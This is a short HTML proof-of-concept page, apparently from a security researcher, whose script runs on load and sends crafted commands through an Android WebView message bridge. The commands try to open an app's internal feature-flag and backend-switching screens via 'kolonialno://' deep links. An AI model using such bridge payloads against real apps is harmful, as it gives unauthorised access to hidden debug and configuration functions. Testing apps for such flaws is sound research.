<html>
<body>
     <h1>Oda Security Research</h1>
     <p>Testing Bridge to Internal Screens...</p>
     <script>
         function trigger(payload) {
             if (window.AndroidMessageHandler) {
                 AndroidMessageHandler.postMessage(JSON.stringify(payload));
             }
         }

         setTimeout(function() {
             // Percobaan 1: Menggunakan skema kolonialno
             trigger({"command":"open-native-url", "url":"kolonialno://android_native/feature_flag"});

             // Percobaan 2: Menggunakan ID screen langsung (jika bridge mendukung)
             setTimeout(function() {
                 trigger({"command":"open-native-url", "url":"feature_flag_setting_screen"});
             }, 1000);

             // Percobaan 3: Mencoba membuka Survey dengan URL internal
             setTimeout(function() {
                 trigger({"command":"open-survey", "jsonUrl":"kolonialno://android_native/change_backend"});
             }, 2000);
         }, 1000);
     </script>
</body>
</html>
